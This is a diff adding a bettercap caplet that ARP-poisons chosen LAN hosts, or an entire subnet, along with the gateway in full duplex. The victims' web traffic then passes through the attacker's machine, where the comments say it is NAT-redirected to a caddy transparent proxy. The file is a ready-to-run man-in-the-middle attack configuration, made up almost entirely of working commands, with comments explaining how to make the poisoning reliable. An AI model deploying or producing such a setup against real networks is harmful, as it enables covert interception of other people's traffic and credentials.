@@ -1,0 +1,32 @@
+# bettercap caplet: ARP-poison targets on the LAN so their traffic flows
+# through this machine. iptables (set up in run.sh) then NAT-redirects
+# ports 80/443 to caddy, which transparently proxies the requests.
+#
+# TARGET_PLACEHOLDER is replaced by run.sh before bettercap is invoked.
+# It accepts a single IP (192.168.1.42), a comma-separated list, or a CIDR
+# (e.g. 192.168.1.0/24 to cover every device on the subnet).
+
+# Poison both the victim(s) and the gateway so return traffic also flows
+# through us - otherwise we only see one direction.
+set arp.spoof.fullduplex true
+
+# Who to poison.
+set arp.spoof.targets TARGET_PLACEHOLDER
+
+# Quiet the sniffer; caddy is doing the inspection, not bettercap.
+set net.sniff.verbose false
+
+# Tighter probe cadence so newly-connected devices get picked up quickly.
+set net.probe.throttle 10
+
+# Build/refresh the host list so arp.spoof has fresh ARP entries to work with.
+# net.probe auto-starts net.recon as a dependency - don't start it explicitly.
+net.probe on
+
+# Give probe a few seconds to ARP the gateway and initial hosts. Without
+# this, arp.spoof starts before we know the gateway MAC and the fullduplex
+# side of the poisoning (gateway -> victim) silently fails to engage.
+sleep 5
+
+# Start poisoning.
+arp.spoof on
